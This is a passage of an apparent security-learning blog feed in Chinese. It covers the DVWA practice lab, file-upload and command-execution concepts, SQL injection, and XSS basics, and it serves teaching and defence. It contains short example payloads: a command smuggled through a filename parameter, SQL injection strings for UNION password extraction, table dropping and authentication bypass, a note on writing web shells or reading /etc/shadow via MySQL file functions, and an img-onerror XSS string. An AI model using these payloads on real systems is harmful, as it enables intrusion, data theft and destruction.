srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710_hue7b4ec4cb7abd897183a8792139fe6c5_35249_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710_hue7b4ec4cb7abd897183a8792139fe6c5_35249_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421155923710"
class="gallery-image"
data-flex-grow="267"
data-flex-basis="641px"
>&lt;/p>
&lt;p>一般说 Brute Force 的时候就是暴力破解了，”跑字典“啊什么的。遍历可能存在的的弱密码。&lt;/p>
&lt;h4 id="command-injection">Command Injection&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139.png"
width="896"
height="266"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139_hu25562b7f964fec8daa9cf0338b8b0c6e_31856_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139_hu25562b7f964fec8daa9cf0338b8b0c6e_31856_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160341139"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="808px"
>&lt;/p>
&lt;p>命令注入，相当经典的一个 ping，应该看一眼就知道指的什么了。&lt;/p>
&lt;h4 id="csrf">CSRF&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952.png"
width="905"
height="363"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952_hu5f2fbd6d82dca55f3f85cc4115c97c39_41581_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952_hu5f2fbd6d82dca55f3f85cc4115c97c39_41581_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160436952"
class="gallery-image"
data-flex-grow="249"
data-flex-basis="598px"
>&lt;/p>
&lt;p>跨站请求伪造，有点摸不着头脑。emm，难道是说这个页面没有考虑 csrf （可能还有cors？），所以能在别的站直接发个 xhr 实现修改密码？&lt;/p>
&lt;h4 id="file-inclusion">File Inclusion&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753.png"
width="912"
height="321"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753_hua44789798500bf09a6d2ea7ea0a9e538_27839_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753_hua44789798500bf09a6d2ea7ea0a9e538_27839_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160749753"
class="gallery-image"
data-flex-grow="284"
data-flex-basis="681px"
>&lt;/p>
&lt;p>没思路。虽然看过 p 大博客信手拈来的文件包含利用，但对着这个页面暂时还是想不出要干啥。&lt;/p>
&lt;blockquote>
&lt;p>PS：刚发现地址栏有点意思&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316.png"
width="337"
height="33"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316_hua5ff4026705173dea9ff93cd0ab7564d_2751_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316_hua5ff4026705173dea9ff93cd0ab7564d_2751_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160947316"
class="gallery-image"
data-flex-grow="1021"
data-flex-basis="2450px"
>&lt;/p>
&lt;/blockquote>
&lt;h4 id="file-upload">File Upload&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745.png"
width="895"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745_hu764096419eb208ee58c131f60e4b10b0_30395_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745_hu764096419eb208ee58c131f60e4b10b0_30395_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161006745"
class="gallery-image"
data-flex-grow="304"
data-flex-basis="730px"
>&lt;/p>
&lt;p>可能是任意文件上传相关的洞？&lt;/p>
&lt;h4 id="insecure-captcha">Insecure CAPTCHA&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749.png"
width="911"
height="306"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749_hu0f16c8e6b310cccc5ccf0aaf8819ad20_36210_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749_hu0f16c8e6b310cccc5ccf0aaf8819ad20_36210_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161050749"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="714px"
>&lt;/p>
&lt;p>看标题还是有点意思的，不安全的验证码指的是可以绕过验证码么？&lt;/p>
&lt;h4 id="sql-injection">SQL Injection&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372.png"
width="909"
height="341"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372_hu5bf7f52e9c2b4302389ebec44db8f820_37409_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372_hu5bf7f52e9c2b4302389ebec44db8f820_37409_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161127372"
class="gallery-image"
data-flex-grow="266"
data-flex-basis="639px"
>&lt;/p>
&lt;p>经典SQL注入。&lt;/p>
&lt;h4 id="sql-injection-blind">SQL Injection (Blind)&lt;/h4>
&lt;p>和上面一样，不过是盲注。&lt;/p>
&lt;h4 id="weak-session-ids">Weak Session IDs&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944.png"
width="912"
height="361"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944_hu0fdf17129a2a99d77936b492c1d40748_32668_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944_hu0fdf17129a2a99d77936b492c1d40748_32668_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161207944"
class="gallery-image"
data-flex-grow="252"
data-flex-basis="606px"
>&lt;/p>
&lt;p>对 PHP 还不够了解，不知道 &lt;code>Weak Session IDs&lt;/code> 指的是什么。可能和 Cookie 里的 &lt;code>PHPSESSID&lt;/code> 有关系？&lt;/p>
&lt;h4 id="xss-dom">XSS (DOM)&lt;/h4>
&lt;p>见下。&lt;/p>
&lt;h4 id="xssreflected">XSS(Reflected)&lt;/h4>
&lt;p>见下。&lt;/p>
&lt;h4 id="xssstored">XSS(Stored)&lt;/h4>
&lt;p>三类 XSS ，页面分别如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348.png"
width="680"
height="276"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348_hu1b4996709ef6808dda534c7704190b50_28036_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348_hu1b4996709ef6808dda534c7704190b50_28036_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(DOM)"
class="gallery-image"
data-flex-grow="246"
data-flex-basis="591px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360.png"
width="685"
height="267"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360_hu0bb9744a0e435d0dcc709c36a8622d4a_28074_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360_hu0bb9744a0e435d0dcc709c36a8622d4a_28074_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(reflected)"
class="gallery-image"
data-flex-grow="256"
data-flex-basis="615px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946.png"
width="679"
height="393"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946_hubc91e88711d10c78d8195fedb9cf37e2_33015_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946_hubc91e88711d10c78d8195fedb9cf37e2_33015_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(Stored)"
class="gallery-image"
data-flex-grow="172"
data-flex-basis="414px"
>&lt;/p>
&lt;p>除了 DOM 型看页面没有思路，另外两个看注入点还是清楚的。&lt;/p>
&lt;h4 id="csp-bypass">CSP Bypass&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897.png"
width="701"
height="290"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897_hu941ee16f0a67ff004f04e4e50818b863_27413_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897_hu941ee16f0a67ff004f04e4e50818b863_27413_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161626897"
class="gallery-image"
data-flex-grow="241"
data-flex-basis="580px"
>&lt;/p>
&lt;p>不了解 CSP，没头绪。&lt;/p>
&lt;h4 id="javascript">JavaScript&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960.png"
width="679"
height="280"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960_huc87a5a196e2cb78c1789a7565c0274b5_25147_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960_huc87a5a196e2cb78c1789a7565c0274b5_25147_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161759960"
class="gallery-image"
data-flex-grow="242"
data-flex-basis="582px"
>&lt;/p>
&lt;p>有点摸不着头脑，指的是在前端用 JS 检查表单不安全？&lt;/p>
&lt;p>看链接里的 &lt;code>es6-proxies-in-depth&lt;/code> 感觉是个绕过前端保护的题。&lt;/p>
&lt;h2 id="初体验总结">初体验总结&lt;/h2>
&lt;p>姑且算是把 DVWA 这个靶场在手里把玩了一下，初步看了看怎么玩、有什么可玩。&lt;/p>
&lt;p>接下来考虑是一题一题难度从低到高慢慢刷过去，实在干不过再跳。&lt;/p></description></item><item><title>安全入门系列-上传漏洞和远程命令执行</title><link>https://nnnewb.github.io/blog/p/get-start-cyber-security-upload-and-remote-command-execution-vulnerability/</link><pubDate>Wed, 20 Apr 2022 15:59:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-cyber-security-upload-and-remote-command-execution-vulnerability/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>迫不及待要找个靶场实践了，抓紧把剩下的两种概念捋一捋。&lt;/p>
&lt;h2 id="任意文件上传">任意文件上传&lt;/h2>
&lt;p>上传漏洞本质是&lt;/p>
&lt;ol>
&lt;li>可以上传任意类型文件&lt;/li>
&lt;li>&lt;strong>可以远程执行或利用被上传的文件发起进一步攻击&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>缺一不可。&lt;/p>
&lt;p>能上传不能利用的情况：&lt;/p>
&lt;p>举例来说，业务代码里没检查上传文件的 &lt;code>mimetype&lt;/code>，你传了一个包含恶意代码的文件&lt;code>I_am_hacker_hahaha.php&lt;/code>上传到了服务器上，但服务端是一个独立 Go 程序，没有 &lt;code>httpd&lt;/code>也没有&lt;code>nginx&lt;/code>，那任你传什么恶意脚本都没用——根本不会去执行你的代码。&lt;/p>
&lt;p>能利用但没法上传的情况：&lt;/p>
&lt;p>比如过滤很完善，会检查文件头的 Magic 之类的。还有一种是服务端用了对象存储服务。阿里云 OSS ，腾讯云 OSS，七牛云。虽然服务器配的是 &lt;code>httpd&lt;/code>+&lt;code>php&lt;/code> 的经典组合，文件名解析漏洞也没补，但上传的文件根本没放服务器上也不行（emm，没依据，不过要是能执行别的服务器上的代码的话就是远程代码执行的大洞了吧）。&lt;/p>
&lt;p>所以要利用的话，应该要求是：&lt;/p>
&lt;ol>
&lt;li>用了 &lt;code>CGI&lt;/code> 这样的协议，传上去的东西有机会被执行。&lt;/li>
&lt;li>用了动态特性比较强的语言，从 &lt;code>php&lt;/code>、&lt;code>python&lt;/code> 到 &lt;code>java&lt;/code> 都有运行时加载代码的能力。php 不多说，即使静态编译的语言如Java，也有像近期闹得比较大的 Log4J 漏洞，就是利用了运行时加载新代码的能力。更进一步如 &lt;code>Go&lt;/code>、&lt;code>C/C++&lt;/code> 运行时加载代码就要靠共享库&lt;code>dlopen&lt;/code>之类的方法了，用得不多雷也不多。PS: &lt;code>LD_PRELOAD&lt;/code>这里认为不是 &lt;strong>运行时&lt;/strong> 加载代码的方法。&lt;/li>
&lt;li>有其他被执行的机会，比如能写到 &lt;code>cron.d&lt;/code> 这样的位置，或者有其他可以结合利用的洞，比如有机会控制命令执行时的环境变量，加上任意文件上传，也能利用&lt;code>LD_PRELOAD&lt;/code>之类的方式把上传的 payload 跑起来。&lt;/li>
&lt;/ol>
&lt;p>总的来说，未经检查和约束的文件上传接口总是危险的。现在没爆雷，将来某天也可能会爆。&lt;/p>
&lt;h2 id="远程代码执行">远程代码执行&lt;/h2>
&lt;h3 id="命令执行">命令执行&lt;/h3>
&lt;p>也好理解，和 SQL 注入是比较类似的。如果服务端有这样的代码&lt;code>system(&amp;quot;ffmpeg -i /tmp/&amp;quot; + $_REQUEST[&amp;quot;filename&amp;quot;])&lt;/code>，那控制了&lt;code>filename&lt;/code>就能让&lt;code>system&lt;/code>去执行任意命令。&lt;/p>
&lt;p>比如传一个 &lt;code>filename=|| touch hello&lt;/code>，整条命令就变成了 &lt;code>ffmpeg -i /tmp/|| touch hello&lt;/code>，&lt;code>||&lt;/code> 或运算连接前后两条命令都会被执行。有&lt;code>Linux&lt;/code>环境可以自己试试&lt;code>false||id&lt;/code>看看&lt;code>id&lt;/code>命令会不会跑起来。&lt;/p>
&lt;h3 id="代码执行">代码执行&lt;/h3>
&lt;p>代码执行是个很宽泛的概念，因为可以执行的东西太多了。&lt;/p>
&lt;p>从最最最底层的，利用栈溢出漏洞覆盖返回地址，让进程执行自己期望的代码，到很上层的，利用&lt;code>eval&lt;/code>这样的函数（在&lt;code>php&lt;/code>、&lt;code>nodejs&lt;/code>、&lt;code>python&lt;/code>环境里都有）执行远程代码。&lt;/p>
&lt;p>还有如&lt;code>dlopen&lt;/code>、java的动态类加载等等，解释执行的语言还可以&lt;code>include&lt;/code>或&lt;code>import&lt;/code>、&lt;code>require&lt;/code>新的代码，等等这些函数的参数如果被用户输入控制的话都会构成远程代码执行的危险。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>其实没什么好总结的，都是些概念性的东西，没有干货。&lt;/p></description></item><item><title>安全入门系列-sql注入</title><link>https://nnnewb.github.io/blog/p/get-start-cyber-security-sql-inject/</link><pubDate>Tue, 19 Apr 2022 11:06:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-cyber-security-sql-inject/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>记得很早以前玩过SQL注入，还在上中学吧好像，拿学校的官网玩。&lt;/p>
&lt;p>SQL注入是个很老的漏洞了，准确说是开发人员水平太差、相关的库和最佳实践还没传播开的那段时期常出现的 &lt;strong>编程错误&lt;/strong> 。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>所谓SQL注入就是用户的输入在服务端组织成SQL的时候未经适当地过滤，结果用户输入扭曲了服务端构造的SQL原意，造成错误。&lt;/p>
&lt;p>比较常见的一种问题就是直接把用户输入拼接到了SQL字符串里。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">handler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">row&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">QueryRow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;SELECT id FROM user WHERE nickname=&amp;#39;%s&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">URL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Query&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="s">&amp;#34;nickname&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>像是上述的代码，如果用户请求 &lt;code>localhost/user?nickname=weakptr&lt;/code>，拼接的SQL结果就是&lt;code>SELECT id FROM user WHERE nickname='weakptr'&lt;/code>，符合预期。但如果用户请求的是&lt;code>localhost/user?nickname=' UNION SELECT password FROM user WHERE nickname='admin' --&lt;/code>，拼接的SQL就会变成 &lt;code>SELECT id FROM user WHERE nickname='' UNION SELECT password FROM user WHERE nickname='admin' --&lt;/code>，也就是会查出 &lt;code>admin&lt;/code> 用户的 &lt;code>password&lt;/code> 字段。&lt;/p>
&lt;p>当然这样的注入并不总是能成功，像是上面我用 go 写的 &lt;code>QueryRow&lt;/code>，在 &lt;code>Scan&lt;/code> 的时候传入的变量数量和类型会和被注入的 SQL 不匹配，返回错误。不过这不代表用 Go 就安全了，因为用户完全可以传个 &lt;code>' DROP TABLE user&lt;/code> 删除整个表，或者拼一个 &lt;code>' or 1=1&lt;/code> 让条件恒真，跳过身份认证。&lt;/p>
&lt;p>对这种问题最好的解决办法就是不要把用户输入直接拼到SQL里，而是用 &lt;code>?&lt;/code> 占位符。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html" target="_blank" rel="noopener"
>https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html&lt;/a>&lt;/p>
&lt;p>Using prepared statements with placeholders for parameter values has the following benefits:&lt;/p>
&lt;ul>
&lt;li>Less overhead for parsing the statement each time it is executed. Typically, database applications process large volumes of almost-identical statements, with only changes to literal or variable values in clauses such as &lt;code>WHERE&lt;/code> for queries and deletes, &lt;code>SET&lt;/code> for updates, and &lt;code>VALUES&lt;/code> for inserts.&lt;/li>
&lt;li>&lt;strong>Protection against SQL injection attacks. The parameter values can contain unescaped SQL quote and delimiter characters.&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>这个特性叫 &lt;code>server-side prepared statement&lt;/code>，在 MySQL 4.1 就引入了。对更古早一些的开发者来说，想写出现安全的服务端代码确实是没有现如今这么轻松的，还得自己关注SQL拼接和转义。而如今像 Go 这样的语言直接把 &lt;code>prepared statement&lt;/code> 写进标准库，当成最佳实践，想写出 bug 都不容易。&lt;/p>
&lt;p>好了回到正题。&lt;/p>
&lt;p>其实硬要说起来 SQL 注入如今也不是完全被杜绝了，因为拼 SQL 始终还是有需求的，对自己代码质量有追求的程序猿还是少数。像是 &lt;code>SELECT ... FROM tbl WHERE ... IN (a,b,c,d,e,f)&lt;/code>，&lt;code>IN&lt;/code> 如果要用 &lt;code>prepared statement&lt;/code> 写就至少要维护一个参数列表和 string builder，但如果像是 python 一类语言，就能偷懒成 &lt;code>cond.map(lambda s: f&amp;quot;'{s}'&amp;quot;).join(',')&lt;/code>，省掉一个参数列表和循环，埋下漏洞。&lt;/p>
&lt;h2 id="漏洞分类">漏洞分类&lt;/h2>
&lt;h3 id="字符型注入">字符型注入&lt;/h3>
&lt;p>简而言之，提交的输入类型是字符串的时候（比如&lt;code>nickname&lt;/code>、&lt;code>address&lt;/code>这样的字段），如果存在上面说的漏洞，那就是一个字符型注入漏洞。&lt;/p>
&lt;p>这里涉及的知识点是 &lt;strong>提交的输入类型&lt;/strong>。对于弱类型语言来说服务端可能没限制前端表单提交的类型，表单是 &lt;code>input type=number&lt;/code> 也接受，字符串也接受，服务端的 web 框架要么推导类型（罕见），要么用客户端的类型（当提交&lt;code>json&lt;/code>一类数据的时候），要么全部当成 &lt;code>bytes&lt;/code>、&lt;code>string&lt;/code>，留给开发者自己处理。&lt;/p>
&lt;p>比较常规的情况是服务端拿到 &lt;code>request.form&lt;/code> 是一个字典类型（总之就是&lt;code>dict&lt;/code>或&lt;code>map&lt;/code>这样的映射类型，不用抠字眼），值要么全是 &lt;code>string&lt;/code> 要么根据一定条件解析成服务端的数据类型（&lt;code>int&lt;/code>、&lt;code>float&lt;/code>、&lt;code>array&lt;/code>等）。&lt;/p>
&lt;p>如果服务端没有解析类型，直接往 SQL 里拼，大多时候就是字符型SQL注入；解析了，是个字符串，往 SQL 里拼，也是字符型注入。&lt;/p>
&lt;p>解析了，不是字符串，再格式化，那就很难控制服务端的SQL了。&lt;/p>
&lt;h3 id="数字型注入">数字型注入&lt;/h3>
&lt;p>数字型注入就是放屁。&lt;/p>
&lt;p>本质依然是你提交的数据没有被服务端检查类型，不管是 &lt;code>int&lt;/code> 还是 &lt;code>string&lt;/code> 直接往 SQL 里拼。非要说和字符型注入的区别就是服务端怎么把自己觉得是数字的内容拼到 SQL 里：&lt;/p>
&lt;ul>
&lt;li>&lt;code>WHERE nickname='{nickname}'&lt;/code> 拼字符串的时候为了不出现SQL语法错误，要加上 &lt;code>''&lt;/code> 单引号。&lt;/li>
&lt;li>&lt;code>WHERE id={id}&lt;/code> 拼数字的时候就不加。&lt;/li>
&lt;/ul>
&lt;p>但凡用 &lt;code>sprintf&lt;/code>格式化个&lt;code>%d&lt;/code>，或者拿什么请求验证框架对输入数据做了个类型检查就没数字型注入什么事儿了。&lt;/p>
&lt;h2 id="注入点">注入点&lt;/h2>
&lt;h3 id="query">query&lt;/h3>
&lt;p>就是出现在 URL Query Parameter 里的 SQL 注入点。比如 &lt;code>GET /user_profile?user_id=1&lt;/code>，&lt;code>user_id=1&lt;/code>没过滤，那注入点就在这里。&lt;/p>
&lt;h3 id="post">post&lt;/h3>
&lt;p>出现在 post 表单里的注入点，&lt;code>content-type&lt;/code> 是 &lt;code>x-www-form-urlencoded&lt;/code> 还是 &lt;code>multipart/form-data&lt;/code>，亦或者 &lt;code>application/json&lt;/code> 都无关紧要。&lt;/p>
&lt;p>只要服务端的代码无脑往 SQL 里拼用户输入，那就是注入漏洞。&lt;/p>
&lt;h3 id="header">header&lt;/h3>
&lt;p>出现在 HTTP Header 里的注入点，比如在 &lt;code>Cookies&lt;/code> 的什么数据，或者自定义的 HTTP 头字段。牢记 SQL 注入漏洞的本质是服务端拿了这些数据无脑往SQL里拼。&lt;/p>
&lt;h2 id="攻击手法">攻击手法&lt;/h2>
&lt;h3 id="报错法">报错法&lt;/h3>
&lt;p>首先从攻击者的视角看肯定是不知道服务器上数据表怎么设计的，所以一上手就直接传个 &lt;code>' UNION SELECT&lt;/code> 查出管理员账号密码是不太现实的。&lt;/p>
&lt;p>当通过传 &lt;code>' or 1=1&lt;/code> 或类似的 payload 确认可能存在 SQL 注入点之后，攻击者可以故意制造一些 SQL 错误，看看服务端有没有直接把错误页返回到浏览器。&lt;/p>
&lt;p>如果服务端没有做好 500 页面处理，直接把面向开发者的错误信息返回给了攻击者，攻击者就能借此获得服务端的信息：比如服务端使用的编程语言、框架、数据库版本、表名等等。如果错误页再人性化一点，比如类型错误顺便打印出变量内容，直接把数据爆出来也有可能。&lt;/p>
&lt;p>没管好 500 页导致错误爆到前端，这种问题也可能造成 SQL 注入以外的漏洞但不是这篇博客想讨论的内容了。&lt;/p>
&lt;p>总之报错法攻击就是根据返回的错误信息调整注入的payload，最终构造合法的 SQL 查出攻击者想要的数据。&lt;/p>
&lt;h3 id="盲注">盲注&lt;/h3>
&lt;p>对于没有 500 页（注入非法SQL不报错）或者只有一个通用的 500 页（不返回具体错误），此时只能盲注。先确定注入的 SQL 会如何影响页面，比如提交合法 payload 时的页面和提交非法 payload 时的页面有何不同。相当于我们有了一个 bit 的观测窗口。&lt;/p>
&lt;p>接着只要构造一个合法的 SQL ，比如 &lt;code>' AND username=admin&lt;/code> 等（例子不好，控制了 SQL其实能干的事情太多了）就能一个字符一个字符爆破出用户名和密码（前提是密码没加盐哈希）。&lt;/p>
&lt;h3 id="读写文件">读写文件&lt;/h3>
&lt;p>比如服务器运行的是MySQL而且权限配置有问题（比如跑在 root），那就可能直接注入一条 &lt;code>LOAD_FILE/OUT_FILE&lt;/code> 之类的函数，写入 Web Shell 或者读到 &lt;code>/etc/shadow&lt;/code> 之类的敏感文件。&lt;/p>
&lt;h2 id="工具">工具&lt;/h2>
&lt;ul>
&lt;li>sqlmap&lt;/li>
&lt;/ul>
&lt;p>只知道这一个。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>现在 SQL 注入的漏洞应该不多了，大概还有些被玩烂了的旧网站依然有这种问题。按现在挖矿的疯狂程度来看，还有这种洞怕是迟早被淦，要么下线要么升级。&lt;/p>
&lt;p>现代的 web 程序这种问题应该不多了，有好用的 ORM 和各种查询工具还手拼 SQL 干啥呢。&lt;/p>
&lt;p>挖 ORM 或者那些查询库的洞就是另一码事了。&lt;/p></description></item><item><title>安全入门系列-xss</title><link>https://nnnewb.github.io/blog/p/xss-day-1/</link><pubDate>Mon, 18 Apr 2022 10:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/xss-day-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>要是开发拿不到更高薪，继续撞天花板，就打算转安全了。考虑5年开发，以及不止5年的各种学习，想转到安全应该不是太难的事。&lt;/p>
&lt;p>且不说转不转行，先了解下安全这行总没错。不转行懂点安全也算优势。&lt;/p>
&lt;blockquote>
&lt;p>编辑于 2022年4月19日&lt;/p>
&lt;/blockquote>
&lt;p>考虑成体系学习，把标题改成了安全入门系列。差不多弄清楚 web 安全主流的攻防方向之后再整理个脑图什么的梳理下怎么深入。&lt;/p>
&lt;h2 id="xss">XSS&lt;/h2>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>XSS全称 Cross Site Scripting，X 就是 Cross（强行冷笑话）。本质是利用不正常的方式，在网页上插入一段可以执行的 JavaScript 代码，实现窃取 Cookie、冒充用户发送请求之类的操作。&lt;/p>
&lt;p>众所周知浏览器按 F12 在开发者工具里想怎么玩弄网页都行，XSS 听起来像是脱裤放屁。但开发者工具是有极限的，骗人打开开发者工具往里面贴自己看不懂的代码，和发个链接一打开就中招显然是两个难度的事情。&lt;/p>
&lt;h3 id="分类">分类&lt;/h3>
&lt;h4 id="反射型">反射型&lt;/h4>
&lt;p>反射型 XSS 利用服务器或前端把请求中的字段渲染成 HTML 的行为来向网页注入 js。比如这样一个页面：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">你好，&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">&amp;lt;/p&amp;gt;
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>页面元素的一部分未经过滤就直接渲染成了 HTML 的一部分，就会产生一个 XSS 漏洞，传递这样一个 &lt;code>name&lt;/code> ： &lt;code>&amp;lt;img src=1 onerror=alert(1)/&amp;gt;&lt;/code> 就能让网页按我们的想法弹窗了。&lt;/p>
&lt;p>之所以叫反射型，是因为注入的 JS 到了服务器又回到了前端，就像是镜子里反射出你自己的影子。&lt;/p>
&lt;h4 id="持久型">持久型&lt;/h4>
